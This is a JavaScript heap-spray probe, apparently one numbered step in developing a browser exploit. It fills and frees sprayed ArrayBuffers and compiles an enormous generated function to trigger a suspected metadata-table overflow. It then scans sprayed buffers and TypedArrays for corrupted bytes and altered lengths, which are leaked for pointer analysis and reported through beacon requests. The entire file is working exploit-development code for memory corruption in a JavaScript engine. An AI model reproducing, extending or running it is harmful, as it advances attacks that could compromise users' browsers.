// p155 — MetadataTable spray diagnostic
//
// p153 got SPRAY-HITS-0 even with correct 100112B size.
// Hypothesis: MetadataTable allocated ABOVE spray → forward sweep misses.
//
// This probe: fill spray with 0xAA pattern, use FinalizationRegistry to
// confirm GC collection, then compile and scan for ANY non-0xAA byte.
// Also: pre-fill spray, compile, then check which direction was corrupted.
//
// Beacon prefix: V155-

(function() {
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V155-' + tag + '?t=' + Date.now(), true);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body || '');
    } catch (e) {}
  }
  function BS(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V155-' + tag + '?t=' + Date.now(), false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body || '');
    } catch (e) {}
  }

  BS('BOOT');

  var BUF_SZ = 100112;
  var SPRAY_COUNT = 300;
  var collected = 0;
  var registry = null;

  // Phase 1: Spray with 0xAA pattern
  var sprays = [];
  var views = [];

  BS('SPRAY-START');
  for (var i = 0; i < SPRAY_COUNT; i++) {
    var ab = new ArrayBuffer(BUF_SZ);
    var v = new Uint8Array(ab);
    // Fill with 0xAA pattern
    for (var j = 0; j < v.length; j++) v[j] = 0xAA;
    sprays.push(ab);
    views.push(v);
  }
  BS('SPRAY-' + SPRAY_COUNT + '-FILLED-AA');

  // Phase 2: Set up FinalizationRegistry to track collection
  if (typeof FinalizationRegistry !== 'undefined') {
    registry = new FinalizationRegistry(function() { collected++; });
    for (var i = 0; i < SPRAY_COUNT; i += 2) {
      registry.register(sprays[i], i);
    }
    BS('FR-REGISTERED-' + (SPRAY_COUNT / 2));
  } else {
    BS('FR-UNAVAILABLE');
  }

  // Phase 3: Free even-indexed buffers
  for (var i = 0; i < SPRAY_COUNT; i += 2) {
    sprays[i] = null;
    views[i] = null;
  }
  BS('FREE-DONE');

  // Phase 4: Aggressive GC forcing
  // Strategy A: Many medium allocations to trigger full GC
  for (var g = 0; g < 12; g++) {
    var garbage = [];
    for (var j = 0; j < 20000; j++) garbage.push(new ArrayBuffer(1024));
    garbage = null;
  }
  BS('GCA-DONE');

  // Strategy B: Force with setTimeout to allow GC between event loop turns
  // Can't do this synchronously, so just report collection count
  BS('COLLECTED-' + collected);

  // Phase 5: Also create TypedArrays as targets (for m_length corruption detection)
  var typedTargets = [];
  for (var i = 0; i < 5000; i++) {
    typedTargets.push(new Uint8Array(16));
  }
  BS('TYPED-TARGETS-' + typedTargets.length);

  // Phase 6: Compile 38M function
  var N = 38348816;
  BS('BUILD-START');

  var CHUNK = 4000000;
  var chunksN = Math.floor(N / CHUNK);
  var rem = N - chunksN * CHUNK;

  var callChunk = 'a();'.repeat(CHUNK);
  var parts = new Array(chunksN + 3);
  parts[0] = 'window.__p155fn=function(a){';
  for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
  parts[chunksN + 1] = 'a();'.repeat(rem);
  parts[chunksN + 2] = '};window.__p155ok=1;';
  callChunk = null;

  var blob = new Blob(parts, { type: 'application/javascript' });
  BS('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
  parts = null;

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');
  sc.onerror = function() { BS('SCRIPT-ERR'); };
  sc.onload = function() {
    BS('COMPILED-' + (window.__p155ok ? 'OK' : 'FAIL'));
    BS('COLLECTED-POST-' + collected);
    setTimeout(phaseScan, 100);
  };
  document.head.appendChild(sc);
  sc.src = url;

  function phaseScan() {
    BS('SCAN-START');

    // Scan A: Check spray buffers for any non-0xAA byte
    var hitBufs = 0;
    var totalChanged = 0;

    for (var i = 1; i < SPRAY_COUNT; i += 2) {
      var view = views[i];
      if (!view) continue;

      var changed = 0;
      var firstOff = -1;
      for (var j = 0; j < view.length; j++) {
        if (view[j] !== 0xAA) {
          changed++;
          if (firstOff === -1) firstOff = j;
        }
      }

      if (changed > 0) {
        hitBufs++;
        totalChanged += changed;
        if (hitBufs <= 5) {
          // Report first few changed bytes
          var sample = '';
          var sc = 0;
          for (var j = firstOff; j < view.length && sc < 20; j++) {
            if (view[j] !== 0xAA) {
              sample += j + ':' + view[j].toString(16) + ' ';
              sc++;
            }
          }
          B('SPRAY-HIT-' + i + '-c' + changed + '-f' + firstOff, sample.trim());
        }
      }
    }

    BS('SPRAY-RESULT-bufs' + hitBufs + '-changed' + totalChanged);

    // Scan B: Check TypedArray targets for m_length corruption
    var corruptedArrays = 0;
    var leakedLengths = [];

    for (var i = 0; i < typedTargets.length; i++) {
      try {
        var len = typedTargets[i].length;
        if (len !== 16) {
          corruptedArrays++;
          if (leakedLengths.length < 10) {
            // Convert to hex for pointer analysis
            var hexLen = len.toString(16);
            leakedLengths.push(i + ':' + hexLen);
          }
        }
      } catch(e) {
        corruptedArrays++;
        if (leakedLengths.length < 10) {
          leakedLengths.push(i + ':ERR');
        }
      }
    }

    BS('TYPED-RESULT-corrupt' + corruptedArrays);
    if (leakedLengths.length > 0) {
      BS('TYPED-LENGTHS', leakedLengths.join('|'));
    }

    // Scan C: Also check TypedArray data for corruption
    var dataCorrupt = 0;
    for (var i = 0; i < Math.min(typedTargets.length, 1000); i++) {
      try {
        var arr = typedTargets[i];
        for (var j = 0; j < arr.length && j < 16; j++) {
          if (arr[j] !== 0) {
            dataCorrupt++;
            break;
          }
        }
      } catch(e) {
        dataCorrupt++;
      }
    }
    BS('DATA-CORRUPT-' + dataCorrupt);

    BS('DONE');
  }
})();
